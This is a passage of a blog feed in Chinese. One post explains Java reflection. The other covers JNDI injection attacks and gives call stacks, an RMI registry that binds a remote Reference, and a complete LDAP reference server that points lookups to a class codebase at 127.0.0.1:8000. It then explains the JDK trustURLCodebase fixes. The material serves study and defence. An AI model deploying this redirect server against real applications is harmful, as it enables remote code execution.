    <content type="html"><![CDATA[<h1 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h1><h1 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a><strong>获取类对象</strong></h1><p>类对象：</p><p>(类加载)JVM第一次读取一个类的时候，将字节码class文件读入到内存的过程，类对象是类加载的产物，一个类只有一个类对象。</p><p>类对象用Class来表示</p><p>三种方式：</p><p>类.class：通过类名获取类对象</p><p>“对象”.getClass()：通过类的对象来获取类对象</p><p>Class.forName(“类全名”)：通过类全名来获取类对象。类全名：包名 + 类名</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//方式一</span>Class&lt;Person&gt; clz1 = Person.class;<span class="hljs-comment">//方式二</span><span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">String</span>&gt; clz2 = <span class="hljs-string">&quot;person1&quot;</span>.getClass();<span class="hljs-comment">//方式三</span>Class&lt;?&gt; clz3 = Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);</code></pre></div><h1 id="获取类的成员属性"><a href="#获取类的成员属性" class="headerlink" title="获取类的成员属性"></a><strong>获取类的成员属性</strong></h1><div class="code-wrapper"><pre><code class="hljs java">getDeclaredField(FieldName)：获取具体的成员属性getDeclaredFields()：获取类中所有的成员属性<span class="hljs-comment">//getDeclaredField：获取具体的成员属性</span><span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> clz.getDeclaredField(<span class="hljs-string">&quot;属性名&quot;</span>);<span class="hljs-comment">//getDeclaredFields：获取类中所有的属性</span>Field[] declaredFields = clz.getDeclaredFields();<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; declaredFields.length; i++) &#123;<span class="hljs-comment">//遍历所有属性字段。输入itar快捷生成for循环</span>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> declaredFields[i];    System.out.println(declaredField);</code></pre></div><h1 id="获取类的构造方法"><a href="#获取类的构造方法" class="headerlink" title="获取类的构造方法"></a><strong>获取类的构造方法</strong></h1><div class="code-wrapper"><pre><code class="hljs java">getDeclaredConstructor(parameterType)：获取类中特定参数个数的构造函数getDeclaredConstructors：获取类中所有的构造函数<span class="hljs-comment">//类的构造函数</span><span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//无参构造函数</span>&#125;<span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span>&#123;<span class="hljs-comment">//一个参数的构造函数</span>    <span class="hljs-built_in">this</span>.name = name;&#125;<span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<span class="hljs-comment">//两个参数的构造函数</span>    <span class="hljs-built_in">this</span>.name = name;    <span class="hljs-built_in">this</span>.age = age;&#125;<span class="hljs-comment">//通过反射获取类的构造函数</span><span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> Person.class;<span class="hljs-type">Constructor</span> <span class="hljs-variable">ZEROconstructor</span> <span class="hljs-operator">=</span> clz.getDeclaredConstructor();<span class="hljs-comment">//获取无参构造函数</span><span class="hljs-type">Constructor</span> <span class="hljs-variable">ONEconstructor</span> <span class="hljs-operator">=</span> clz.getDeclaredConstructor(java.lang.String.class);<span class="hljs-comment">//获取一个参数的构造函数</span><span class="hljs-type">Constructor</span> <span class="hljs-variable">TWOconstructor</span> <span class="hljs-operator">=</span> clz.getDeclaredConstructor(java.lang.String.class,<span class="hljs-type">int</span>.class);<span class="hljs-comment">//获取两个参数的构造函数</span>Constructor[] constructors = clz.getDeclaredConstructors();<span class="hljs-comment">//获取所有的构造函数</span><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; constructors.length; i++) &#123;<span class="hljs-comment">//遍历所有构造函数</span>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> constructors[i];    System.out.println(constructor);</code></pre></div><h1 id="获取类的成员方法"><a href="#获取类的成员方法" class="headerlink" title="获取类的成员方法"></a><strong>获取类的成员方法</strong></h1><div class="code-wrapper"><pre><code class="hljs java">getDeclaredMethod：获取具体的方法getDeclaredMethods：获取所有的方法<span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clz.getDeclaredMethod(<span class="hljs-string">&quot;方法名&quot;</span>);<span class="hljs-comment">//getDeclaredMethod：获取具体的方法</span>Method[] declaredMethods = clz.getDeclaredMethods();<span class="hljs-comment">//getDeclaredMethods：获取所有的方法</span><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; declaredMethods.length; i++) &#123;<span class="hljs-comment">//遍历所有方法</span>    <span class="hljs-type">Method</span> <span class="hljs-variable">declaredMethod</span> <span class="hljs-operator">=</span> declaredMethods[i];    System.out.println(declaredMethod);&#125;</code></pre></div><h1 id="通过反射创建类对象"><a href="#通过反射创建类对象" class="headerlink" title="通过反射创建类对象"></a><strong>通过反射创建类对象</strong></h1><div class="code-wrapper"><pre><code class="hljs java">newInstance()：创建实例<span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> Person.class;<span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> clz.newInstance();<span class="hljs-comment">//通过类创建对象</span><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clz.getDeclaredConstructor(java.lang.String.class,<span class="hljs-type">int</span>.class);<span class="hljs-type">Object</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;CAOFALIN&quot;</span>,<span class="hljs-number">23</span>);<span class="hljs-comment">//通过类的构造函数创建对象</span></code></pre></div><h1 id="通过反射修改私有属性"><a href="#通过反射修改私有属性" class="headerlink" title="通过反射修改私有属性"></a><strong>通过反射修改私有属性</strong></h1><div class="code-wrapper"><pre><code class="hljs java">field.setAccessible(<span class="hljs-literal">true</span>)field.set(Object,<span class="hljs-string">&quot;value&quot;</span>)field.get(Object)<span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> Person.class;<span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> clz.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<span class="hljs-type">Field</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> clz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);name.setAccessible(<span class="hljs-literal">true</span>);age.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> clz.newInstance();name.set(obj,<span class="hljs-string">&quot;CAOFALIN&quot;</span>);age.set(obj,<span class="hljs-number">100</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> name.get(obj);<span class="hljs-type">Object</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> age.get(obj);System.out.println(o1);System.out.println(o2);</code></pre></div><h1 id="通过反射执行私有方法"><a href="#通过反射执行私有方法" class="headerlink" title="通过反射执行私有方法"></a><strong>通过反射执行私有方法</strong></h1><p>主要方法：</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态类加载</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入攻击"><a href="#JNDI注入攻击" class="headerlink" title="JNDI注入攻击"></a>JNDI注入攻击</h1><p>RMI从远程获取class类时，会进行反序列化操作，进而RCE</p><p>JNDI通过引用对象从远程获取class类时，会进行类加载和类实例化操作，攻击者利用这两个操作可进行RCE</p><p>两种方式的调用链</p><div class="code-wrapper"><pre><code class="hljs java">加载远程引用readObject:<span class="hljs-number">364</span>, ObjectInputStream (java.io)deserializeObject:<span class="hljs-number">531</span>, Obj (com.sun.jndi.ldap)decodeObject:<span class="hljs-number">239</span>, Obj (com.sun.jndi.ldap)c_lookup:<span class="hljs-number">1051</span>, LdapCtx (com.sun.jndi.ldap)p_lookup:<span class="hljs-number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:<span class="hljs-number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:<span class="hljs-number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)lookup:<span class="hljs-number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)反序列化newInstance:<span class="hljs-number">396</span>, Class (java.lang)getObjectFactoryFromReference:<span class="hljs-number">163</span>, NamingManager (javax.naming.spi)getObjectInstance:<span class="hljs-number">189</span>, DirectoryManager (javax.naming.spi)c_lookup:<span class="hljs-number">1085</span>, LdapCtx (com.sun.jndi.ldap)p_lookup:<span class="hljs-number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:<span class="hljs-number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:<span class="hljs-number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)lookup:<span class="hljs-number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)</code></pre></div><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p>RMI可以做什么</p><h2 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h2><p>客户端远程调用服务端的方法在服务端执行</p><h2 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a>动态加载类</h2><p>当RMI服务端或客户端不存在某个类时，可向指定的codebase地址加载类</p><p>前提</p><p>服务端：codebase地址可控</p><p>客户端：</p><p>1、配置了访问权限</p><p>1、配置了SecurityManager</p><p>2、Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly&#x3D;false</p><p>传输过程中会进行反序列化</p><h1 id="RMI-JNDI"><a href="#RMI-JNDI" class="headerlink" title="RMI-JNDI"></a>RMI-JNDI</h1><h2 id="RMI服务端"><a href="#RMI服务端" class="headerlink" title="RMI服务端"></a>RMI服务端</h2><h3 id="RMI绑定远程对象"><a href="#RMI绑定远程对象" class="headerlink" title="RMI绑定远程对象"></a>RMI绑定远程对象</h3><h3 id="RMI绑定引用对象"><a href="#RMI绑定引用对象" class="headerlink" title="RMI绑定引用对象"></a>RMI绑定引用对象</h3><p>JNDIServer_RMIRef.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<span class="hljs-type">Reference</span> <span class="hljs-variable">refObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;TestRef&quot;</span>, <span class="hljs-string">&quot;TestRef&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span>);<span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(refObj);registry.bind(<span class="hljs-string">&quot;exp&quot;</span>, refObjWrapper);</code></pre></div><p>调用栈</p><div class="code-wrapper"><pre><code class="hljs java">newInstance:<span class="hljs-number">396</span>, Class (java.lang)getObjectFactoryFromReference:<span class="hljs-number">163</span>, NamingManager (javax.naming.spi)getObjectInstance:<span class="hljs-number">319</span>, NamingManager (javax.naming.spi)decodeObject:<span class="hljs-number">464</span>, RegistryContext (com.sun.jndi.rmi.registry)lookup:<span class="hljs-number">124</span>, RegistryContext (com.sun.jndi.rmi.registry)lookup:<span class="hljs-number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)main:<span class="hljs-number">9</span>, JNDIClient</code></pre></div><h2 id="JNDI客户端"><a href="#JNDI客户端" class="headerlink" title="JNDI客户端"></a>JNDI客户端</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();context.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/exp&quot;</span>);<span class="hljs-comment">//context.lookup(&quot;ldap://localhost:1389/exp&quot;);</span></code></pre></div><h1 id="LDAP-JNDI"><a href="#LDAP-JNDI" class="headerlink" title="LDAP-JNDI"></a>LDAP-JNDI</h1><h2 id="LDAP服务端"><a href="#LDAP服务端" class="headerlink" title="LDAP服务端"></a>LDAP服务端</h2><h3 id="LDAP绑定引用对象"><a href="#LDAP绑定引用对象" class="headerlink" title="LDAP绑定引用对象"></a>LDAP绑定引用对象</h3><p>JNDIServer_LDAPRef.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.InetAddress;<span class="hljs-keyword">import</span> java.net.MalformedURLException;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<span class="hljs-keyword">import</span> javax.net.SocketFactory;<span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer_LDAPRef</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] tmp_args )</span> &#123;        String[] args=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;http://127.0.0.1:8000/#TestRef&quot;</span>&#125;;        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(                    <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//$NON-NLS-1$</span>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>), <span class="hljs-comment">//$NON-NLS-1$</span>                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(args[ <span class="hljs-number">0</span> ])));            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="hljs-comment">//$NON-NLS-1$</span>            ds.startListening();        &#125;        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;        <span class="hljs-keyword">private</span> URL codebase;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;            <span class="hljs-built_in">this</span>.codebase = cb;        &#125;        <span class="hljs-meta">@Override</span>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);            <span class="hljs-keyword">try</span> &#123;                sendResult(result, base, e);            &#125;            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;                e1.printStackTrace();            &#125;        &#125;        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);            &#125;            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>); <span class="hljs-comment">//$NON-NLS-1$</span>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());            result.sendSearchEntry(e);            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));        &#125;    &#125;&#125;</code></pre></div><p>调用栈</p><div class="code-wrapper"><pre><code class="hljs java">newInstance:<span class="hljs-number">396</span>, Class (java.lang)getObjectFactoryFromReference:<span class="hljs-number">163</span>, NamingManager (javax.naming.spi)getObjectInstance:<span class="hljs-number">189</span>, DirectoryManager (javax.naming.spi)c_lookup:<span class="hljs-number">1085</span>, LdapCtx (com.sun.jndi.ldap)p_lookup:<span class="hljs-number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:<span class="hljs-number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:<span class="hljs-number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)lookup:<span class="hljs-number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)main:<span class="hljs-number">10</span>, JNDIClient</code></pre></div><h2 id="JNDI客户端-1"><a href="#JNDI客户端-1" class="headerlink" title="JNDI客户端"></a>JNDI客户端</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();context.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/exp&quot;</span>);<span class="hljs-comment">//context.lookup(&quot;ldap://localhost:1389/exp&quot;);</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/20200419225882.png"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><div class="code-wrapper"><pre><code class="hljs stylus">JDK <span class="hljs-number">6</span>u45、<span class="hljs-number">7</span>u21之后：java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。JDK <span class="hljs-number">6</span>u141、<span class="hljs-number">7</span>u131、<span class="hljs-number">8</span>u121之后：增加了com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.object</span>.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项（依赖对象），因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。JDK <span class="hljs-number">6</span>u211、<span class="hljs-number">7</span>u201、<span class="hljs-number">8</span>u191之后：增加了com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.ldap</span><span class="hljs-selector-class">.object</span>.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</code></pre></div><h2 id="RMI-loadclass"><a href="#RMI-loadclass" class="headerlink" title="RMI-loadclass"></a>RMI-loadclass</h2><h2 id="RMI-Ref"><a href="#RMI-Ref" class="headerlink" title="RMI-Ref"></a>RMI-Ref</h2><p>在com.sun.jndi.rmi.registry.RegistryContext#decodeObject中对<strong>trustURLCodebase</strong>校验</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">decodeObject</span><span class="hljs-params">(Remote var1, Name var2)</span> <span class="hljs-keyword">throws</span> NamingException &#123;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-type">Object</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var1 <span class="hljs-keyword">instanceof</span> RemoteReference ? ((RemoteReference) var1).getReference() : var1;        <span class="hljs-type">Reference</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">if</span> (var3 <span class="hljs-keyword">instanceof</span> Reference) &#123;            var8 = (Reference) var3;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var3 <span class="hljs-keyword">instanceof</span> Referenceable) &#123;            var8 = ((Referenceable)((Referenceable) var3)).getReference();        &#125;        <span class="hljs-keyword">if</span> (var8 != <span class="hljs-literal">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="hljs-literal">null</span> &amp;&amp; !trustURLCodebase) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConfigurationException</span>(<span class="hljs-string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.environment);        &#125;    &#125; <span class="hljs-keyword">catch</span> (NamingException var5) &#123;        <span class="hljs-keyword">throw</span> var5;    &#125; <span class="hljs-keyword">catch</span> (RemoteException var6) &#123;        <span class="hljs-keyword">throw</span> (NamingException) wrapRemoteException(var6).fillInStackTrace();    &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;        <span class="hljs-type">NamingException</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NamingException</span>();        var4.setRootCause(var7);        <span class="hljs-keyword">throw</span> var4;    &#125;&#125;</code></pre></div><p>trustURLCodebase的默认值</p><p>com.sun.jndi.rmi.registry.RegistryContext</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;    <span class="hljs-type">PrivilegedAction</span> <span class="hljs-variable">var0</span> <span class="hljs-operator">=</span> () - &gt; &#123;        <span class="hljs-keyword">return</span> System.getProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>);    &#125;;    <span class="hljs-type">String</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> (String) AccessController.doPrivileged(var0);    trustURLCodebase = <span class="hljs-string">&quot;true&quot;</span>.equalsIgnoreCase(var1);&#125;</code></pre></div><h2 id="LDAP-Ref"><a href="#LDAP-Ref" class="headerlink" title="LDAP-Ref"></a>LDAP-Ref</h2><p>在com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)中对<strong>trustURLCodebase</strong>校验</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class &lt;? &gt; loadClass(String className, String codebase) <span class="hljs-keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> getContextClassLoader();        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(getUrlArray(codebase), parent);        <span class="hljs-keyword">return</span> loadClass(className, cl);    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div><p>trustURLCodebase的默认值</p><p>com.sun.naming.internal.VersionHelper12</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TRUST_URL_CODEBASE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>;<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">trustURLCodebase</span> <span class="hljs-operator">=</span> AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span> &lt; String &gt; () &#123;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">return</span> System.getProperty(TRUST_URL_CODEBASE_PROPERTY, <span class="hljs-string">&quot;false&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (SecurityException e) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;false&quot;</span>;        &#125;    &#125;&#125;);</code></pre></div><h1 id="JNDI利用链"><a href="#JNDI利用链" class="headerlink" title="JNDI利用链"></a>JNDI利用链</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://segmentfault.com/a/1190000041143177?utm_source=sf-similar-article">https://segmentfault.com/a/1190000041143177?utm_source=sf-similar-article</a></p><p><a href="https://xz.aliyun.com/t/8214">https://xz.aliyun.com/t/8214</a></p><p><a href="https://forum.butian.net/share/1873">https://forum.butian.net/share/1873</a></p><p><a href="https://www.cnblogs.com/CoLo/p/15468660.html">https://www.cnblogs.com/CoLo/p/15468660.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
